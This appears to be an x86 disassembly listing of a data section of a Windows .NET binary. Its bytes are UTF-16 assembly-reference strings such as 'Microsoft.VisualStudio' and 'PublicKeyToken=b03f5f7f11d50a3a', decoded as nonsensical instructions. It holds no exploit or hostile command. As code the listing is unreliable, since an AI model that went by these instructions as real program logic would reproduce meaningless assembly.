  407fc4:	add    BYTE PTR fs:0x61003000,dh
  407fcb:	add    BYTE PTR [ebx],dh
  407fcd:	add    BYTE PTR [ecx+0x0],ah
  407fd0:	or     dh,0x4d
  407fd3:	add    BYTE PTR [ecx+0x0],ch
  407fd6:	arpl   WORD PTR [eax],ax
  407fd8:	jb     0x407fda
  407fda:	outs   dx,DWORD PTR ds:[esi]
  407fdb:	add    BYTE PTR [ebx+0x0],dh
  407fde:	outs   dx,DWORD PTR ds:[esi]
  407fdf:	add    BYTE PTR [esi+0x0],ah
  407fe2:	je     0x407fe4
  407fe4:	add    BYTE PTR cs:[esi+0x0],dl
  407fe8:	imul   eax,DWORD PTR [eax],0x750073
  407fee:	popa   
  407fef:	add    BYTE PTR [eax+eax*1+0x53],ch
  407ff3:	add    BYTE PTR [eax+eax*1+0x75],dh
  407ff7:	add    BYTE PTR [eax+eax*1+0x69],ah
  407ffb:	add    BYTE PTR [edi+0x0],ch
  407ffe:	add    BYTE PTR cs:[edi+0x0],dl
  408002:	imul   eax,DWORD PTR [eax],0x64006e
  408008:	outs   dx,DWORD PTR ds:[esi]
  408009:	add    BYTE PTR [edi+0x0],dh
  40800c:	jae    0x40800e
  40800e:	add    BYTE PTR cs:[esi+0x0],al
  408012:	outs   dx,DWORD PTR ds:[esi]
  408013:	add    BYTE PTR [edx+0x0],dh
  408016:	ins    DWORD PTR es:[edi],dx
  408017:	add    BYTE PTR [ebx+0x0],dh
  40801a:	sub    al,0x0
  40801c:	and    BYTE PTR [eax],al
  40801e:	push   esi
  40801f:	add    BYTE PTR [ebp+0x0],ah
  408022:	jb     0x408024
  408024:	jae    0x408026
  408026:	imul   eax,DWORD PTR [eax],0x6e006f
  40802c:	cmp    eax,0x2e003400
  408031:	add    BYTE PTR [eax],dh
  408033:	add    BYTE PTR [esi],ch
  408035:	add    BYTE PTR [eax],dh
  408037:	add    BYTE PTR [esi],ch
  408039:	add    BYTE PTR [eax],dh
  40803b:	add    BYTE PTR [eax+eax*1],ch
  40803e:	and    BYTE PTR [eax],al
  408040:	inc    ebx
  408041:	add    BYTE PTR [ebp+0x0],dh
  408044:	ins    BYTE PTR es:[edi],dx
  408045:	add    BYTE PTR [eax+eax*1+0x75],dh
  408049:	add    BYTE PTR [edx+0x0],dh
  40804c:	add    BYTE PTR gs:0x65006e00,bh
  408053:	add    BYTE PTR [ebp+0x0],dh
  408056:	je     0x408058
  408058:	jb     0x40805a
  40805a:	popa   
  40805b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40805f:	add    BYTE PTR [eax],ah
  408061:	add    BYTE PTR [eax+0x0],dl
  408064:	jne    0x408066
  408066:	bound  eax,QWORD PTR [eax]
  408068:	ins    BYTE PTR es:[edi],dx
  408069:	add    BYTE PTR [ecx+0x0],ch
  40806c:	arpl   WORD PTR [eax],ax
  40806e:	dec    ebx
  40806f:	add    BYTE PTR [ebp+0x0],ah
  408072:	jns    0x408074
  408074:	push   esp
  408075:	add    BYTE PTR [edi+0x0],ch
  408078:	imul   eax,DWORD PTR [eax],0x65
  40807b:	add    BYTE PTR [esi+0x0],ch
  40807e:	cmp    eax,0x30006200
  408083:	add    BYTE PTR [ebx],dh
  408085:	add    BYTE PTR [esi+0x0],ah
  408088:	xor    eax,0x37006600
  40808d:	add    BYTE PTR [esi+0x0],ah
  408090:	xor    DWORD PTR [eax],eax
  408092:	xor    DWORD PTR [eax],eax
  408094:	add    BYTE PTR fs:0x61003000,dh
  40809b:	add    BYTE PTR [ebx],dh
  40809d:	add    BYTE PTR [ecx+0x0],ah
  4080a0:	sub    BYTE PTR [esi+edx*2+0x53004a00],0x0
  4080a8:	push   0x72006100
  4080ad:	add    BYTE PTR [eax+0x0],dh
  4080b0:	inc    ebx
  4080b1:	add    BYTE PTR [edi+0x0],ch
  4080b4:	add    BYTE PTR fs:[ebp+0x0],ah
  4080b8:	push   eax
  4080b9:	add    BYTE PTR [edx+0x0],dh
  4080bc:	outs   dx,DWORD PTR ds:[esi]
  4080bd:	add    BYTE PTR [esi+0x0],dh
  4080c0:	imul   eax,DWORD PTR [eax],0x650064
  4080c6:	jb     0x4080c8
  4080c8:	sub    al,0x0
  4080ca:	and    BYTE PTR [eax],al
  4080cc:	push   esi
  4080cd:	add    BYTE PTR [ebp+0x0],ah
  4080d0:	jb     0x4080d2
  4080d2:	jae    0x4080d4
  4080d4:	imul   eax,DWORD PTR [eax],0x6e006f
  4080da:	cmp    eax,0x2e003400
  4080df:	add    BYTE PTR [eax],dh
  4080e1:	add    BYTE PTR [esi],ch
  4080e3:	add    BYTE PTR [eax],dh
  4080e5:	add    BYTE PTR [esi],ch
  4080e7:	add    BYTE PTR [eax],dh
  4080e9:	add    BYTE PTR [eax+eax*1],ch
  4080ec:	and    BYTE PTR [eax],al
  4080ee:	inc    ebx
  4080ef:	add    BYTE PTR [ebp+0x0],dh
  4080f2:	ins    BYTE PTR es:[edi],dx
  4080f3:	add    BYTE PTR [eax+eax*1+0x75],dh
  4080f7:	add    BYTE PTR [edx+0x0],dh
  4080fa:	add    BYTE PTR gs:0x65006e00,bh
  408101:	add    BYTE PTR [ebp+0x0],dh
  408104:	je     0x408106
  408106:	jb     0x408108
  408108:	popa   
  408109:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40810d:	add    BYTE PTR [eax],ah
  40810f:	add    BYTE PTR [eax+0x0],dl
  408112:	jne    0x408114
  408114:	bound  eax,QWORD PTR [eax]
  408116:	ins    BYTE PTR es:[edi],dx
  408117:	add    BYTE PTR [ecx+0x0],ch
  40811a:	arpl   WORD PTR [eax],ax
  40811c:	dec    ebx
  40811d:	add    BYTE PTR [ebp+0x0],ah
  408120:	jns    0x408122
  408122:	push   esp
  408123:	add    BYTE PTR [edi+0x0],ch
  408126:	imul   eax,DWORD PTR [eax],0x65
  408129:	add    BYTE PTR [esi+0x0],ch
  40812c:	cmp    eax,0x30006200
  408131:	add    BYTE PTR [ebx],dh
  408133:	add    BYTE PTR [esi+0x0],ah
  408136:	xor    eax,0x37006600
  40813b:	add    BYTE PTR [esi+0x0],ah
  40813e:	xor    DWORD PTR [eax],eax
  408140:	xor    DWORD PTR [eax],eax
  408142:	add    BYTE PTR fs:0x61003000,dh
  408149:	add    BYTE PTR [ebx],dh
  40814b:	add    BYTE PTR [ecx+0x0],ah
  40814e:	and    BYTE PTR [edx+0x0],ah
  408151:	aaa    
  408152:	add    BYTE PTR [edx+0x0],ah
  408155:	add    BYTE PTR fs:[edi],dh
  408158:	add    BYTE PTR [esi],dh
  40815a:	add    BYTE PTR [edi],dh
  40815c:	add    BYTE PTR [eax],bh
  40815e:	add    BYTE PTR [edx+0x0],ah
  408161:	cmp    DWORD PTR [eax],eax
  408163:	aaa    
  408164:	add    BYTE PTR [edi],dh
  408166:	add    BYTE PTR [edx+0x0],ah
  408169:	add    BYTE PTR fs:[eax],bh
  40816c:	add    BYTE PTR [esi+0x0],ah
  40816f:	xor    BYTE PTR [edx+0x530041],0x50
  408176:	add    BYTE PTR [esi],ch
  408178:	add    BYTE PTR [edx+0x0],al
  40817b:	jb     0x40817d
  40817d:	outs   dx,DWORD PTR ds:[esi]
  40817e:	add    BYTE PTR [edi+0x0],dh
  408181:	jae    0x408183
  408183:	add    BYTE PTR gs:[edx+0x0],dh
  408187:	inc    ebx
  408188:	add    BYTE PTR [ecx+0x0],ah
  40818b:	jo     0x40818d
  40818d:	jae    0x40818f
  40818f:	inc    esi
  408190:	add    BYTE PTR [ecx+0x0],ah
  408193:	arpl   WORD PTR [eax],ax
  408195:	je     0x408197
  408197:	outs   dx,DWORD PTR ds:[esi]
  408198:	add    BYTE PTR [edx+0x0],dh
  40819b:	jns    0x40819d
  40819d:	sub    al,0x0
  40819f:	and    BYTE PTR [eax],al
  4081a1:	push   esi
  4081a2:	add    BYTE PTR [ebp+0x0],ah
  4081a5:	jb     0x4081a7
  4081a7:	jae    0x4081a9
  4081a9:	imul   eax,DWORD PTR [eax],0x6e006f
  4081af:	cmp    eax,0x2e003400
  4081b4:	add    BYTE PTR [eax],dh
  4081b6:	add    BYTE PTR [esi],ch
  4081b8:	add    BYTE PTR [eax],dh
  4081ba:	add    BYTE PTR [esi],ch
  4081bc:	add    BYTE PTR [eax],dh
  4081be:	add    BYTE PTR [eax+eax*1],ch
  4081c1:	and    BYTE PTR [eax],al
  4081c3:	inc    ebx
  4081c4:	add    BYTE PTR [ebp+0x0],dh
  4081c7:	ins    BYTE PTR es:[edi],dx
  4081c8:	add    BYTE PTR [eax+eax*1+0x75],dh
  4081cc:	add    BYTE PTR [edx+0x0],dh
  4081cf:	add    BYTE PTR gs:0x65006e00,bh
  4081d6:	add    BYTE PTR [ebp+0x0],dh
  4081d9:	je     0x4081db
  4081db:	jb     0x4081dd
  4081dd:	popa   
  4081de:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4081e2:	add    BYTE PTR [eax],ah
  4081e4:	add    BYTE PTR [eax+0x0],dl
  4081e7:	jne    0x4081e9
  4081e9:	bound  eax,QWORD PTR [eax]
  4081eb:	ins    BYTE PTR es:[edi],dx
  4081ec:	add    BYTE PTR [ecx+0x0],ch
  4081ef:	arpl   WORD PTR [eax],ax
  4081f1:	dec    ebx
  4081f2:	add    BYTE PTR [ebp+0x0],ah
  4081f5:	jns    0x4081f7
  4081f7:	push   esp
  4081f8:	add    BYTE PTR [edi+0x0],ch
  4081fb:	imul   eax,DWORD PTR [eax],0x65
  4081fe:	add    BYTE PTR [esi+0x0],ch
  408201:	cmp    eax,0x37006200
  408206:	add    BYTE PTR [edx+0x0],ah
  408209:	add    BYTE PTR fs:[edi],dh
  40820c:	add    BYTE PTR [esi],dh
  40820e:	add    BYTE PTR [edi],dh
  408210:	add    BYTE PTR [eax],bh
  408212:	add    BYTE PTR [edx+0x0],ah
  408215:	cmp    DWORD PTR [eax],eax
  408217:	aaa    
  408218:	add    BYTE PTR [edi],dh
  40821a:	add    BYTE PTR [edx+0x0],ah
  40821d:	add    BYTE PTR fs:[eax],bh
  408220:	add    BYTE PTR [esi+0x0],ah
  408223:	xor    BYTE PTR [eax+0x69004d],0x63
  40822a:	add    BYTE PTR [edx+0x0],dh
  40822d:	outs   dx,DWORD PTR ds:[esi]
  40822e:	add    BYTE PTR [ebx+0x0],dh
  408231:	outs   dx,DWORD PTR ds:[esi]
  408232:	add    BYTE PTR [esi+0x0],ah
  408235:	je     0x408237
  408237:	add    BYTE PTR cs:[esi+0x0],dl
  40823b:	push   ebx
  40823c:	add    BYTE PTR [eax+eax*1+0x65],al
  408240:	add    BYTE PTR [ebx+0x0],dh
  408243:	imul   eax,DWORD PTR [eax],0x6e0067
  408249:	add    BYTE PTR gs:[edx+0x0],dh
  40824d:	sub    al,0x0
  40824f:	and    BYTE PTR [eax],al
  408251:	push   esi
  408252:	add    BYTE PTR [ebp+0x0],ah
  408255:	jb     0x408257
  408257:	jae    0x408259
  408259:	imul   eax,DWORD PTR [eax],0x6e006f
  40825f:	cmp    eax,0x30003100
  408264:	add    BYTE PTR [esi],ch
  408266:	add    BYTE PTR [eax],dh
  408268:	add    BYTE PTR [esi],ch
  40826a:	add    BYTE PTR [eax],dh
  40826c:	add    BYTE PTR [esi],ch
  40826e:	add    BYTE PTR [eax],dh
  408270:	add    BYTE PTR [eax+eax*1],ch
  408273:	and    BYTE PTR [eax],al
  408275:	inc    ebx
  408276:	add    BYTE PTR [ebp+0x0],dh
  408279:	ins    BYTE PTR es:[edi],dx
  40827a:	add    BYTE PTR [eax+eax*1+0x75],dh
  40827e:	add    BYTE PTR [edx+0x0],dh
  408281:	add    BYTE PTR gs:0x65006e00,bh
  408288:	add    BYTE PTR [ebp+0x0],dh
  40828b:	je     0x40828d
  40828d:	jb     0x40828f
  40828f:	popa   
  408290:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408294:	add    BYTE PTR [eax],ah
  408296:	add    BYTE PTR [eax+0x0],dl
  408299:	jne    0x40829b
  40829b:	bound  eax,QWORD PTR [eax]
  40829d:	ins    BYTE PTR es:[edi],dx
  40829e:	add    BYTE PTR [ecx+0x0],ch
  4082a1:	arpl   WORD PTR [eax],ax
  4082a3:	dec    ebx
  4082a4:	add    BYTE PTR [ebp+0x0],ah
  4082a7:	jns    0x4082a9
  4082a9:	push   esp
  4082aa:	add    BYTE PTR [edi+0x0],ch
  4082ad:	imul   eax,DWORD PTR [eax],0x65
  4082b0:	add    BYTE PTR [esi+0x0],ch
  4082b3:	cmp    eax,0x30006200
  4082b8:	add    BYTE PTR [ebx],dh
  4082ba:	add    BYTE PTR [esi+0x0],ah
  4082bd:	xor    eax,0x37006600
  4082c2:	add    BYTE PTR [esi+0x0],ah
  4082c5:	xor    DWORD PTR [eax],eax
  4082c7:	xor    DWORD PTR [eax],eax
  4082c9:	add    BYTE PTR fs:0x61003000,dh
  4082d0:	add    BYTE PTR [ebx],dh
  4082d2:	add    BYTE PTR [ecx+0x0],ah
  4082d5:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  4082dd:	jb     0x4082df
  4082df:	outs   dx,DWORD PTR ds:[esi]
  4082e0:	add    BYTE PTR [ebx+0x0],dh
  4082e3:	outs   dx,DWORD PTR ds:[esi]
  4082e4:	add    BYTE PTR [esi+0x0],ah
  4082e7:	je     0x4082e9
  4082e9:	add    BYTE PTR cs:[esi+0x0],dl
  4082ed:	imul   eax,DWORD PTR [eax],0x750073
  4082f3:	popa   
  4082f4:	add    BYTE PTR [eax+eax*1+0x53],ch
  4082f8:	add    BYTE PTR [eax+eax*1+0x75],dh
  4082fc:	add    BYTE PTR [eax+eax*1+0x69],ah
  408300:	add    BYTE PTR [edi+0x0],ch
  408303:	add    BYTE PTR cs:[edi+0x0],dl
  408307:	add    BYTE PTR gs:[edx+0x0],ah
  40830b:	sub    al,0x0
  40830d:	and    BYTE PTR [eax],al
  40830f:	push   esi
  408310:	add    BYTE PTR [ebp+0x0],ah
  408313:	jb     0x408315
  408315:	jae    0x408317
  408317:	imul   eax,DWORD PTR [eax],0x6e006f
  40831d:	cmp    eax,0x30003100
  408322:	add    BYTE PTR [esi],ch
  408324:	add    BYTE PTR [eax],dh
  408326:	add    BYTE PTR [esi],ch
  408328:	add    BYTE PTR [eax],dh
  40832a:	add    BYTE PTR [esi],ch
  40832c:	add    BYTE PTR [eax],dh
  40832e:	add    BYTE PTR [eax+eax*1],ch
  408331:	and    BYTE PTR [eax],al
  408333:	inc    ebx
  408334:	add    BYTE PTR [ebp+0x0],dh
  408337:	ins    BYTE PTR es:[edi],dx
  408338:	add    BYTE PTR [eax+eax*1+0x75],dh
  40833c:	add    BYTE PTR [edx+0x0],dh
  40833f:	add    BYTE PTR gs:0x65006e00,bh
  408346:	add    BYTE PTR [ebp+0x0],dh
  408349:	je     0x40834b
  40834b:	jb     0x40834d
  40834d:	popa   
  40834e:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408352:	add    BYTE PTR [eax],ah
  408354:	add    BYTE PTR [eax+0x0],dl
  408357:	jne    0x408359
  408359:	bound  eax,QWORD PTR [eax]
  40835b:	ins    BYTE PTR es:[edi],dx
  40835c:	add    BYTE PTR [ecx+0x0],ch
  40835f:	arpl   WORD PTR [eax],ax
  408361:	dec    ebx
  408362:	add    BYTE PTR [ebp+0x0],ah
  408365:	jns    0x408367
  408367:	push   esp
  408368:	add    BYTE PTR [edi+0x0],ch
  40836b:	imul   eax,DWORD PTR [eax],0x65
  40836e:	add    BYTE PTR [esi+0x0],ch
  408371:	cmp    eax,0x30006200
  408376:	add    BYTE PTR [ebx],dh
  408378:	add    BYTE PTR [esi+0x0],ah
  40837b:	xor    eax,0x37006600
  408380:	add    BYTE PTR [esi+0x0],ah
  408383:	xor    DWORD PTR [eax],eax
  408385:	xor    DWORD PTR [eax],eax
  408387:	add    BYTE PTR fs:0x61003000,dh
  40838e:	add    BYTE PTR [ebx],dh
  408390:	add    BYTE PTR [ecx+0x0],ah
  408393:	cmp    BYTE PTR [esi+0x69004d],0x63
  40839a:	add    BYTE PTR [edx+0x0],dh
  40839d:	outs   dx,DWORD PTR ds:[esi]
  40839e:	add    BYTE PTR [ebx+0x0],dh
  4083a1:	outs   dx,DWORD PTR ds:[esi]
  4083a2:	add    BYTE PTR [esi+0x0],ah
  4083a5:	je     0x4083a7
  4083a7:	add    BYTE PTR cs:[edi+0x0],dl
  4083ab:	add    BYTE PTR gs:[edx+0x0],ah
  4083af:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  4083b4:	add    BYTE PTR [ebx+0x0],dh
  4083b7:	imul   eax,DWORD PTR [eax],0x6e0067
  4083bd:	add    BYTE PTR cs:[ebx+0x0],al
  4083c1:	ins    BYTE PTR es:[edi],dx
  4083c2:	add    BYTE PTR [ecx+0x0],ch
  4083c5:	add    BYTE PTR gs:[esi+0x0],ch
  4083c9:	je     0x4083cb
  4083cb:	sub    al,0x0
  4083cd:	and    BYTE PTR [eax],al
  4083cf:	push   esi
  4083d0:	add    BYTE PTR [ebp+0x0],ah
  4083d3:	jb     0x4083d5
  4083d5:	jae    0x4083d7
  4083d7:	imul   eax,DWORD PTR [eax],0x6e006f
  4083dd:	cmp    eax,0x30003100
  4083e2:	add    BYTE PTR [esi],ch
  4083e4:	add    BYTE PTR [eax],dh
  4083e6:	add    BYTE PTR [esi],ch
  4083e8:	add    BYTE PTR [eax],dh
  4083ea:	add    BYTE PTR [esi],ch
  4083ec:	add    BYTE PTR [eax],dh
  4083ee:	add    BYTE PTR [eax+eax*1],ch
  4083f1:	and    BYTE PTR [eax],al
  4083f3:	inc    ebx
  4083f4:	add    BYTE PTR [ebp+0x0],dh
  4083f7:	ins    BYTE PTR es:[edi],dx
  4083f8:	add    BYTE PTR [eax+eax*1+0x75],dh
  4083fc:	add    BYTE PTR [edx+0x0],dh
  4083ff:	add    BYTE PTR gs:0x65006e00,bh
  408406:	add    BYTE PTR [ebp+0x0],dh
  408409:	je     0x40840b
  40840b:	jb     0x40840d
  40840d:	popa   
  40840e:	add    BYTE PTR [eax+eax*1+0x2c],ch
  408412:	add    BYTE PTR [eax],ah
  408414:	add    BYTE PTR [eax+0x0],dl
  408417:	jne    0x408419
  408419:	bound  eax,QWORD PTR [eax]
  40841b:	ins    BYTE PTR es:[edi],dx
  40841c:	add    BYTE PTR [ecx+0x0],ch
  40841f:	arpl   WORD PTR [eax],ax
  408421:	dec    ebx
  408422:	add    BYTE PTR [ebp+0x0],ah
  408425:	jns    0x408427
  408427:	push   esp
  408428:	add    BYTE PTR [edi+0x0],ch
  40842b:	imul   eax,DWORD PTR [eax],0x65
  40842e:	add    BYTE PTR [esi+0x0],ch
  408431:	cmp    eax,0x30006200
  408436:	add    BYTE PTR [ebx],dh
  408438:	add    BYTE PTR [esi+0x0],ah
  40843b:	xor    eax,0x37006600
  408440:	add    BYTE PTR [esi+0x0],ah
  408443:	xor    DWORD PTR [eax],eax
  408445:	xor    DWORD PTR [eax],eax
  408447:	add    BYTE PTR fs:0x61003000,dh
  40844e:	add    BYTE PTR [ebx],dh
  408450:	add    BYTE PTR [ecx+0x0],ah
  408453:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40845b:	jb     0x40845d
  40845d:	outs   dx,DWORD PTR ds:[esi]
  40845e:	add    BYTE PTR [ebx+0x0],dh
  408461:	outs   dx,DWORD PTR ds:[esi]
  408462:	add    BYTE PTR [esi+0x0],ah
  408465:	je     0x408467
  408467:	add    BYTE PTR cs:[esi+0x0],dl
  40846b:	push   ebx
  40846c:	add    BYTE PTR [eax+eax*1+0x65],al
  408470:	add    BYTE PTR [ebx+0x0],dh
  408473:	imul   eax,DWORD PTR [eax],0x6e0067
  408479:	add    BYTE PTR gs:[edx+0x0],dh
  40847d:	add    BYTE PTR cs:[ebp+0x0],cl
  408481:	outs   dx,DWORD PTR ds:[esi]
  408482:	add    BYTE PTR [edx+0x0],ah
  408485:	imul   eax,DWORD PTR [eax],0x65006c
  40848b:	sub    al,0x0
  40848d:	and    BYTE PTR [eax],al
  40848f:	push   esi
  408490:	add    BYTE PTR [ebp+0x0],ah
  408493:	jb     0x408495
  408495:	jae    0x408497
  408497:	imul   eax,DWORD PTR [eax],0x6e006f
  40849d:	cmp    eax,0x2e003800
  4084a2:	add    BYTE PTR [eax],dh
  4084a4:	add    BYTE PTR [esi],ch
  4084a6:	add    BYTE PTR [eax],dh
  4084a8:	add    BYTE PTR [esi],ch
  4084aa:	add    BYTE PTR [eax],dh
  4084ac:	add    BYTE PTR [eax+eax*1],ch
  4084af:	and    BYTE PTR [eax],al
  4084b1:	inc    ebx
  4084b2:	add    BYTE PTR [ebp+0x0],dh
  4084b5:	ins    BYTE PTR es:[edi],dx
  4084b6:	add    BYTE PTR [eax+eax*1+0x75],dh
  4084ba:	add    BYTE PTR [edx+0x0],dh
  4084bd:	add    BYTE PTR gs:0x65006e00,bh
  4084c4:	add    BYTE PTR [ebp+0x0],dh
  4084c7:	je     0x4084c9
  4084c9:	jb     0x4084cb
  4084cb:	popa   
  4084cc:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4084d0:	add    BYTE PTR [eax],ah
  4084d2:	add    BYTE PTR [eax+0x0],dl
  4084d5:	jne    0x4084d7
  4084d7:	bound  eax,QWORD PTR [eax]
  4084d9:	ins    BYTE PTR es:[edi],dx
  4084da:	add    BYTE PTR [ecx+0x0],ch
  4084dd:	arpl   WORD PTR [eax],ax
  4084df:	dec    ebx
  4084e0:	add    BYTE PTR [ebp+0x0],ah
  4084e3:	jns    0x4084e5
  4084e5:	push   esp
  4084e6:	add    BYTE PTR [edi+0x0],ch
  4084e9:	imul   eax,DWORD PTR [eax],0x65
  4084ec:	add    BYTE PTR [esi+0x0],ch
  4084ef:	cmp    eax,0x30006200
  4084f4:	add    BYTE PTR [ebx],dh
  4084f6:	add    BYTE PTR [esi+0x0],ah
  4084f9:	xor    eax,0x37006600
  4084fe:	add    BYTE PTR [esi+0x0],ah
  408501:	xor    DWORD PTR [eax],eax
  408503:	xor    DWORD PTR [eax],eax
  408505:	add    BYTE PTR fs:0x61003000,dh
  40850c:	add    BYTE PTR [ebx],dh
  40850e:	add    BYTE PTR [ecx+0x0],ah
  408511:	sub    BYTE PTR [eax+0x69004d],0x63
  408518:	add    BYTE PTR [edx+0x0],dh
  40851b:	outs   dx,DWORD PTR ds:[esi]
  40851c:	add    BYTE PTR [ebx+0x0],dh
  40851f:	outs   dx,DWORD PTR ds:[esi]
  408520:	add    BYTE PTR [esi+0x0],ah
  408523:	je     0x408525
  408525:	add    BYTE PTR cs:[edx+0x0],cl
  408529:	push   ebx
  40852a:	add    BYTE PTR [ebx+0x0],ah
  40852d:	jb     0x40852f
  40852f:	imul   eax,DWORD PTR [eax],0x740070
  408535:	sub    al,0x0
  408537:	and    BYTE PTR [eax],al
  408539:	push   esi
  40853a:	add    BYTE PTR [ebp+0x0],ah
  40853d:	jb     0x40853f
  40853f:	jae    0x408541
  408541:	imul   eax,DWORD PTR [eax],0x6e006f
  408547:	cmp    eax,0x2e003800
  40854c:	add    BYTE PTR [eax],dh
  40854e:	add    BYTE PTR [esi],ch
  408550:	add    BYTE PTR [eax],dh
  408552:	add    BYTE PTR [esi],ch
  408554:	add    BYTE PTR [eax],dh
  408556:	add    BYTE PTR [eax+eax*1],ch
  408559:	and    BYTE PTR [eax],al
  40855b:	inc    ebx
  40855c:	add    BYTE PTR [ebp+0x0],dh
  40855f:	ins    BYTE PTR es:[edi],dx
  408560:	add    BYTE PTR [eax+eax*1+0x75],dh
  408564:	add    BYTE PTR [edx+0x0],dh
  408567:	add    BYTE PTR gs:0x65006e00,bh
  40856e:	add    BYTE PTR [ebp+0x0],dh
  408571:	je     0x408573
  408573:	jb     0x408575
  408575:	popa   
  408576:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40857a:	add    BYTE PTR [eax],ah
  40857c:	add    BYTE PTR [eax+0x0],dl
  40857f:	jne    0x408581
  408581:	bound  eax,QWORD PTR [eax]
  408583:	ins    BYTE PTR es:[edi],dx
  408584:	add    BYTE PTR [ecx+0x0],ch
  408587:	arpl   WORD PTR [eax],ax
  408589:	dec    ebx
  40858a:	add    BYTE PTR [ebp+0x0],ah
  40858d:	jns    0x40858f
  40858f:	push   esp
  408590:	add    BYTE PTR [edi+0x0],ch
  408593:	imul   eax,DWORD PTR [eax],0x65
  408596:	add    BYTE PTR [esi+0x0],ch
  408599:	cmp    eax,0x30006200
  40859e:	add    BYTE PTR [ebx],dh
  4085a0:	add    BYTE PTR [esi+0x0],ah
  4085a3:	xor    eax,0x37006600
  4085a8:	add    BYTE PTR [esi+0x0],ah
  4085ab:	xor    DWORD PTR [eax],eax
  4085ad:	xor    DWORD PTR [eax],eax
  4085af:	add    BYTE PTR fs:0x61003000,dh
  4085b6:	add    BYTE PTR [ebx],dh
  4085b8:	add    BYTE PTR [ecx+0x0],ah
  4085bb:	add    al,BYTE PTR [esi]
  4085bd:	add    al,BYTE PTR [ebx]
  4085bf:	sub    BYTE PTR [eax],al
  4085c1:	push   cs
  4085c2:	add    al,0x20
  4085c4:	add    DWORD PTR [esi],ecx
  4085c6:	push   cs
  4085c7:	push   cs
  4085c8:	jbe    0x4085ca
  4085ca:	add    BYTE PTR gs:[edx+0x0],dh
  4085ce:	jae    0x4085d0
  4085d0:	imul   eax,DWORD PTR [eax],0x6e006f
  4085d6:	sbb    ch,BYTE PTR [ecx+0x0]
  4085d9:	outs   dx,BYTE PTR ds:[esi]
  4085da:	add    BYTE PTR [esi+0x0],dh
  4085dd:	popa   
  4085de:	add    BYTE PTR [eax+eax*1+0x69],ch
  4085e2:	add    BYTE PTR [eax+eax*1+0x41],ah
  4085e6:	add    BYTE PTR [edx+0x0],dh
  4085e9:	add    BYTE PTR [di+0x0],al
  4085ed:	jb     0x4085ef
  4085ef:	jb     0x4085f1
  4085f1:	sbb    al,0x6e
  4085f3:	add    BYTE PTR [edi+0x0],ch
  4085f6:	inc    ebx
  4085f7:	add    BYTE PTR [eax+eax*1+0x61],ch
  4085fb:	add    BYTE PTR [ebx+0x0],dh
  4085fe:	jae    0x408600
  408600:	dec    esi
  408601:	add    BYTE PTR [ecx+0x0],ah
  408604:	ins    DWORD PTR es:[edi],dx
  408605:	add    BYTE PTR [ebp+0x0],ah
  408608:	inc    ebp
  408609:	add    BYTE PTR [edx+0x0],dh
  40860c:	jb     0x40860e
  40860e:	and    BYTE PTR [ebx+0x0],ah
  408611:	ins    BYTE PTR es:[edi],dx
  408612:	add    BYTE PTR [ecx+0x0],ah
  408615:	jae    0x408617
  408617:	jae    0x408619
  408619:	dec    esi
  40861a:	add    BYTE PTR [edi+0x0],ch
  40861d:	je     0x40861f
  40861f:	inc    esi
  408620:	add    BYTE PTR [edi+0x0],ch
  408623:	jne    0x408625
  408625:	outs   dx,BYTE PTR ds:[esi]
  408626:	add    BYTE PTR [eax+eax*1+0x45],ah
  40862a:	add    BYTE PTR [edx+0x0],dh
  40862d:	jb     0x40862f
  40862f:	add    BYTE PTR es:[di+0x0],ah
  408634:	outs   dx,BYTE PTR ds:[esi]
  408635:	add    BYTE PTR [ebp+0x0],ah
  408638:	jb     0x40863a
  40863a:	popa   
  40863b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40863f:	add    BYTE PTR [esi+0x0],ch
  408642:	add    BYTE PTR [bp+di+0x0],al
  408646:	ins    BYTE PTR es:[edi],dx
  408647:	add    BYTE PTR [ecx+0x0],ah
  40864a:	jae    0x40864c
  40864c:	jae    0x40864e
  40864e:	dec    esi
  40864f:	add    BYTE PTR [ecx+0x0],ah
  408652:	ins    DWORD PTR es:[edi],dx
  408653:	add    BYTE PTR [ebp+0x0],ah
  408656:	sbb    al,0x63
  408658:	add    BYTE PTR [edi+0x0],ch
  40865b:	add    BYTE PTR fs:[ebp+0x0],ah
  40865f:	inc    edi
  408660:	add    BYTE PTR [ebp+0x0],ah
  408663:	outs   dx,BYTE PTR ds:[esi]
  408664:	add    BYTE PTR [ebx+0x0],dl
  408667:	jne    0x408669
  408669:	arpl   WORD PTR [eax],ax
  40866b:	arpl   WORD PTR [eax],ax
  40866d:	add    BYTE PTR gs:[ebx+0x0],dh
  408671:	jae    0x408673
  408673:	adc    al,0x63
  408675:	add    BYTE PTR [edi+0x0],ch
  408678:	add    BYTE PTR fs:[ebp+0x0],ah
  40867c:	inc    edi
  40867d:	add    BYTE PTR [ebp+0x0],ah
  408680:	outs   dx,BYTE PTR ds:[esi]
  408681:	add    BYTE PTR [ebp+0x0],al
  408684:	jb     0x408686
  408686:	jb     0x408688
  408688:	adc    al,0x67
  40868a:	add    BYTE PTR [ebp+0x0],ah
  40868d:	outs   dx,BYTE PTR ds:[esi]
  40868e:	add    BYTE PTR [ebp+0x0],ah
  408691:	jb     0x408693
  408693:	imul   eax,DWORD PTR [eax],0x450063
  408699:	jb     0x40869b
  40869b:	jb     0x40869d
  40869d:	sbb    BYTE PTR [edi+0x0],dh
  4086a0:	ins    DWORD PTR es:[edi],dx
  4086a1:	add    BYTE PTR [ecx+0x0],ch
  4086a4:	dec    esi
  4086a5:	add    BYTE PTR [ecx+0x0],ah
  4086a8:	ins    DWORD PTR es:[edi],dx
  4086a9:	add    BYTE PTR [ebp+0x0],ah
  4086ac:	push   ebx
  4086ad:	add    BYTE PTR [eax+0x0],dh
  4086b0:	popa   
  4086b1:	add    BYTE PTR [ebx+0x0],ah
  4086b4:	add    BYTE PTR gs:[ebx+eiz*2],bl
  4086b8:	add    BYTE PTR [eax+eax*1+0x61],ch
  4086bc:	add    BYTE PTR [ebx+0x0],dh
  4086bf:	jae    0x4086c1
  4086c1:	dec    esi
  4086c2:	add    BYTE PTR [ecx+0x0],ah
